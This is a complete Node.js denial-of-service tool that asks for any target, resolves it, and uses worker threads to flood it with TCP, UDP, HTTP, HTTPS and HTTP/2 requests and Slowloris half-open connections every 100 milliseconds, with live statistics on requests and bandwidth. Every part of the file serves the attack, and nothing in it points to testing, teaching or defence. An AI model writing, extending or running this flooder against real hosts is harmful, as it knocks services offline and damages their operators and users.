#!/usr/bin/env node
'use strict';

const net = require('net');
const dgram = require('dgram');
const http = require('http');
const https = require('https');
const http2 = require('http2');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const { performance } = require('perf_hooks');
const readline = require('readline');
const { randomBytes, randomFillSync } = require('crypto');
const url = require('url');
const dns = require('dns/promises');

class AttackController {
    constructor() {
        this.stats = { total: 0, success: 0, failed: 0, bandwidth: 0 };
        this.workers = [];
        this.methods = ['TCP','UDP','HTTP','HTTPS','HTTP2','SLOWLORIS'];
    }

    async initialize() {
        const target = await this.ask('Target: ');
        const { hostname, port } = await this.resolveTarget(target);
        const threads = await this.getNumberInput('Threads: ', 100, 1000);
        const duration = await this.getNumberInput('Duration (s): ', 10, 3600);
        
        this.startTime = performance.now();
        this.launchWorkers(hostname, port, threads);
        this.displayStats();
        setTimeout(() => this.stop(), duration * 1000);
    }

    async resolveTarget(input) {
        try {
            if (!input.includes('://')) input = 'http://' + input;
            const urlObj = new url.URL(input);
            const host = await dns.lookup(urlObj.hostname);
            return {
                hostname: host.address,
                port: urlObj.port || (urlObj.protocol === 'https:' ? 443 : 80)
            };
        } catch {
            console.error('Invalid target');
            process.exit(1);
        }
    }

    launchWorkers(target, port, threads) {
        const cores = Math.min(require('os').cpus().length, 12);
        const payloads = this.generatePayloads(target);
        
        for (let i = 0; i < cores; i++) {
            const worker = new Worker(__filename, {
                workerData: {
                    target,
                    port,
                    payloads,
                    methods: this.methods,
                    intensity: Math.ceil(threads/cores)
                }
            });

            worker.on('message', msg => this.updateStats(msg));
            this.workers.push(worker);
        }
    }

    generatePayloads(target) {
        const createPayload = size => {
            const buf = Buffer.alloc(size);
            randomFillSync(buf);
            return buf;
        };

        return {
            tcp: createPayload(1024),
            udp: createPayload(65507),
            http: `GET /${randomBytes(8).toString('hex')} HTTP/1.1\r\nHost: ${target}\r\n\r\n`
        };
    }

    updateStats({ total, success, failed, bw }) {
        this.stats.total += total;
        this.stats.success += success;
        this.stats.failed += failed;
        this.stats.bandwidth += bw;
    }

    displayStats() {
        if (!this.startTime) return;
        
        const elapsed = (performance.now() - this.startTime) / 1000;
        const rps = (this.stats.total / elapsed || 0).toFixed(0);
        const bw = (this.stats.bandwidth / 1024 ** 3).toFixed(3);

        process.stdout.write(
            `\r[${elapsed.toFixed(1)}s] ` +
            `Req: ${this.stats.total} ` +
            `OK: ${this.stats.success} ` +
            `FAIL: ${this.stats.failed} ` +
            `RPS: ${rps} ` +
            `BW: ${bw}GB`
        );

        setTimeout(() => this.displayStats(), 500);
    }

    async ask(question) {
        return new Promise(resolve => {
            const rl = readline.createInterface({
                input: process.stdin,
                output: process.stdout
            });
            rl.question(question, answer => {
                rl.close();
                resolve(answer);
            });
        });
    }

    async getNumberInput(question, min, max) {
        let num;
        do {
            num = parseInt(await this.ask(question)) || min;
        } while (num < min || num > max);
        return num;
    }

    stop() {
        this.workers.forEach(w => w.terminate());
        console.log('\nAttack stopped');
        process.exit();
    }
}

if (isMainThread) {
    new AttackController().initialize();
} else {
    const { target, port, payloads, methods, intensity } = workerData;
    const sockets = new Set();

    const attack = {
        TCP: () => {
            const socket = net.connect(port, target, () => {
                socket.write(payloads.tcp);
                report('success', payloads.tcp.length);
                socket.end();
            });
            socket.on('error', () => report('failed', 0));
        },

        UDP: () => {
            const socket = dgram.createSocket('udp4');
            socket.send(payloads.udp, port, target, err => {
                err ? report('failed', 0) : report('success', payloads.udp.length);
                socket.close();
            });
        },

        HTTP: () => {
            const req = http.get(`http://${target}:${port}`, () => report('success', 0));
            req.on('error', () => report('failed', 0));
        },

        HTTPS: () => {
            const req = https.get(`https://${target}:${port}`, { rejectUnauthorized: false }, () => report('success', 0));
            req.on('error', () => report('failed', 0));
        },

        HTTP2: () => {
            const client = http2.connect(`https://${target}:${port}`, { rejectUnauthorized: false });
            const req = client.request({ ':path': '/' });
            req.on('data', () => {});
            req.on('end', () => {
                report('success', 0);
                client.close();
            });
            req.on('error', () => report('failed', 0));
        },

        SLOWLORIS: () => {
            const socket = net.connect(port, target);
            socket.write('GET / HTTP/1.1\r\nHost: ' + target + '\r\n');
            sockets.add(socket);
            socket.on('error', () => sockets.delete(socket));
        }
    };

    function report(status, bytes) {
        parentPort.postMessage({
            total: 1,
            success: status === 'success' ? 1 : 0,
            failed: status === 'failed' ? 1 : 0,
            bw: bytes || 0
        });
    }

    setInterval(() => {
        methods.forEach(method => {
            for (let i = 0; i < intensity; i++) {
                try {
                    attack[method]();
                } catch {
                    report('failed', 0);
                }
            }
        });
    }, 100);
}